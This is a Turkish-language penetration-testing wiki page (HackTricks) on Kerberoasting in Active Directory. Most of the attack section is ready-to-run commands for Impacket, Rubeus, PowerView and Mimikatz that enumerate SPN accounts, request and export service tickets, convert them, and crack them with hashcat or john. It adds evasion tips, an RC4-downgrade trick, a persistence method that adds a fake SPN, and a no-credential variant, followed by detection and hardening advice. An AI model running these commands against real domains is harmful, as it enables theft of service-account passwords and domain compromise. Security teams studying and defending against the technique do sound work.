# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, Active Directory (AD) altında kullanıcı hesaplarıyla çalışan hizmetlere ait TGS biletlerinin edinilmesine odaklanır; bilgisayar hesapları hariçtir. Bu biletlerin şifrelemesi, kullanıcı şifrelerinden türetilen anahtarları kullanır ve bu da çevrimdışı kimlik bilgisi kırma imkanı sağlar. Bir kullanıcı hesabının hizmet olarak kullanıldığını gösteren, boş olmayan bir ServicePrincipalName (SPN) özelliği vardır.

Herhangi bir kimlik doğrulaması yapılmış alan kullanıcısı TGS biletleri talep edebilir, bu nedenle özel ayrıcalıklara ihtiyaç yoktur.

### Ana Noktalar

- Kullanıcı hesapları altında çalışan hizmetler için TGS biletlerini hedef alır (yani, SPN ayarlanmış hesaplar; bilgisayar hesapları değil).
- Biletler, hizmet hesabının şifresinden türetilen bir anahtar ile şifrelenir ve çevrimdışı olarak kırılabilir.
- Yükseltilmiş ayrıcalıklar gerekmez; herhangi bir kimlik doğrulaması yapılmış hesap TGS biletleri talep edebilir.

> [!WARNING]
> Çoğu kamu aracı, AES'ten daha hızlı kırıldığı için RC4-HMAC (etype 23) hizmet biletlerini talep etmeyi tercih eder. RC4 TGS hash'leri `$krb5tgs$23$*` ile başlarken, AES128 `$krb5tgs$17$*` ile ve AES256 `$krb5tgs$18$*` ile başlar. Ancak, birçok ortam yalnızca AES'e geçiş yapmaktadır. Sadece RC4'ün geçerli olduğunu varsaymayın.
> Ayrıca, “spray-and-pray” roasting'den kaçının. Rubeus'un varsayılan kerberoast'ı tüm SPN'ler için bilet sorgulayabilir ve talep edebilir ve gürültülüdür. Öncelikle ilginç ilkeleri sıralayın ve hedefleyin.

### Saldırı

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Çoklu özellik araçları, kerberoast kontrollerini içerir:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoastable kullanıcıları listele
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Teknik 1: TGS isteyin ve belleği dökün
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Teknik 2: Otomatik araçlar
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Bir TGS isteği Windows Güvenlik Olayı 4769'u (Bir Kerberos hizmet bileti istendi) oluşturur.

### OPSEC ve yalnızca AES ortamları

- AES olmayan hesaplar için kasıtlı olarak RC4 isteği yapın:
- Rubeus: `/rc4opsec` AES olmayan hesapları listelemek için tgtdeleg kullanır ve RC4 hizmet biletleri talep eder.
- Rubeus: `/tgtdeleg` ile kerberoast, mümkün olduğunda RC4 isteklerini de tetikler.
- Sessizce başarısız olmak yerine yalnızca AES olan hesapları roaster:
- Rubeus: `/aes` AES etkin olan hesapları listeler ve AES hizmet biletleri talep eder (etype 17/18).
- Zaten bir TGT'ye (PTT veya bir .kirbi'den) sahipseniz, `/ticket:<blob|path>` ile `/spn:<SPN>` veya `/spns:<file>` kullanabilir ve LDAP'ı atlayabilirsiniz.
- Hedefleme, kısıtlama ve daha az gürültü:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` ve `/jitter:<1-100>` kullanın.
- Daha zayıf şifreler için `/pwdsetbefore:<MM-dd-yyyy>` (eski şifreler) ile filtreleyin veya ayrıcalıklı OU'ları `/ou:<DN>` ile hedefleyin.

Örnekler (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Kırma
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Süreklilik / Suistimal

Eğer bir hesabı kontrol ediyorsanız veya değiştirebiliyorsanız, bir SPN ekleyerek onu kerberoastable hale getirebilirsiniz:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Bir hesabı düşürerek daha kolay kırma için RC4'ü etkinleştirin (hedef nesne üzerinde yazma ayrıcalıkları gerektirir):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Burada kerberoast saldırıları için yararlı araçlar bulabilirsiniz: https://github.com/nidem/kerberoast

Eğer Linux'tan bu hatayı alırsanız: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` bu yerel saat kaymasından kaynaklanmaktadır. DC ile senkronize edin:

- `ntpdate <DC_IP>` (bazı dağıtımlarda kullanımdan kaldırılmıştır)
- `rdate -n <DC_IP>`

### Tespit

Kerberoasting gizli olabilir. DC'lerden Event ID 4769 için avlanın ve gürültüyü azaltmak için filtreler uygulayın:

- `krbtgt` hizmet adını ve `$` ile biten hizmet adlarını hariç tutun (bilgisayar hesapları).
- Makine hesaplarından gelen istekleri hariç tutun (`*$$@*`).
- Sadece başarılı istekler (Başarısızlık Kodu `0x0`).
- Şifreleme türlerini takip edin: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Sadece `0x17` üzerinde uyarı vermeyin.

Örnek PowerShell ön değerlendirme:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ekstra fikirler:

- Her bir host/kullanıcı için normal SPN kullanımını temel alın; tek bir prensipten gelen farklı SPN isteklerinde büyük patlamalar için uyarı verin.
- AES güçlendirilmiş alanlarda alışılmadık RC4 kullanımını işaretleyin.

### Önleme / Güçlendirme

- Hizmetler için gMSA/dMSA veya makine hesapları kullanın. Yönetilen hesaplar 120+ karakter rastgele şifreler içerir ve otomatik olarak döner, bu da çevrimdışı kırmayı pratik hale getirmez.
- Hizmet hesaplarında AES'i zorunlu kılmak için `msDS-SupportedEncryptionTypes` değerini yalnızca AES (ondalık 24 / hex 0x18) olarak ayarlayın ve ardından şifreyi değiştirerek AES anahtarlarının türetilmesini sağlayın.
- Mümkünse, ortamınızda RC4'ü devre dışı bırakın ve RC4 kullanımına yönelik girişimleri izleyin. DC'lerde, `msDS-SupportedEncryptionTypes` ayarı yapılmamış hesaplar için varsayılanları yönlendirmek üzere `DefaultDomainSupportedEncTypes` kayıt defteri değerini kullanabilirsiniz. Kapsamlı test yapın.
- Kullanıcı hesaplarından gereksiz SPN'leri kaldırın.
- Yönetilen hesaplar mümkün değilse, uzun, rastgele hizmet hesabı şifreleri (25+ karakter) kullanın; yaygın şifreleri yasaklayın ve düzenli olarak denetleyin.

### Kerberoast bir alan hesabı olmadan (AS-talep edilen ST'ler)

Eylül 2022'de, Charlie Clark, bir prensip ön kimlik doğrulama gerektirmiyorsa, istek gövdesindeki sname'i değiştirerek KRB_AS_REQ aracılığıyla bir hizmet bileti almanın mümkün olduğunu gösterdi; bu, bir TGT yerine bir hizmet bileti almak anlamına gelir. Bu, AS-REP kızartmasına benzer ve geçerli alan kimlik bilgileri gerektirmez.

Detaylar için: Semperis yazısı “Yeni Saldırı Yolları: AS-talep edilen ST'ler”.

> [!WARNING]
> Geçerli kimlik bilgileri olmadan LDAP'ı bu teknikle sorgulayamayacağınız için bir kullanıcı listesi sağlamalısınız.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
İlgili

Eğer AS-REP roastable kullanıcıları hedefliyorsanız, ayrıca bakın:

{{#ref}}
asreproast.md
{{#endref}}

## Referanslar

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoft’ın Kerberoasting’i azaltmaya yardımcı olmak için rehberi: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting belgeleri: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
